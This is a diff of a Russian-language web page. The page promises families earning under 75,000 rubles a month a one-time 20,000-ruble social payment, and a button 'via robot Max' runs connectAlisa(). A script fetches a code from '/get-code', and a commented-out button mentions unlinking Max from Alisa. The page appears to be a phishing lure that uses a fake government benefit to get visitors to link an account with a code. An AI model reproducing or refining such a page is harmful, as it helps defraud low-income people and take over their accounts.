@@ -87,31 +87,22 @@
 <body>
 
 <div>
-
+    <div>
+        <object type="image/svg+xml" data="./max.svg" width="200" height="200" ></object>
+    </div>
     <div class="column">
         <div>
-            <object type="image/svg+xml" data="./one.svg" width="200" height="200" ></object>
+            <h2>Ежегодная социальная надбавка</h2>
         </div>
-        <div >
-            <div>
-                <object type="image/svg+xml" data="./max.svg" width="200" height="200" ></object>
-            </div>
-            <div class="column">
-                <div>
-                    <h2>Ежегодная социальная надбавка</h2>
-                </div>
-                <div>
-                    Если семьи менее 75 000 рубей в месяц. Вам положена единоразовая выплата в размере 20 000 рублей за 2024 год из Фонда Социального Страхования.
-                </div>
-                <div>
-                    <button onclick="connectAlisa()">Оставить заявку через робота Макса</button>
-                </div>
-
-            </div>
-
-
+        <div>
+            Если семьи менее 75 000 рубей в месяц. Вам положена единоразовая выплата в размере 20 000 рублей за 2024 год из Фонда Социального Страхования.
         </div>
+        <div>
+            <button onclick="connectAlisa()">Оставить заявку через робота Макса</button>
+        </div>
+
     </div>
+
     <script>
         let code;
         const response = fetch('/get-code').then(async response => {
@@ -135,13 +126,13 @@
         }
     </script>
 
-    <button onclick="fastDisconnectAlisa()">Попробуем заново?</button>
+
 </div>
 
 
 
 
-
+<!--<button onclick="fastDisconnectAlisa()">Отвязать Макса от Алисы</button>-->
 
 </body>
 </html>
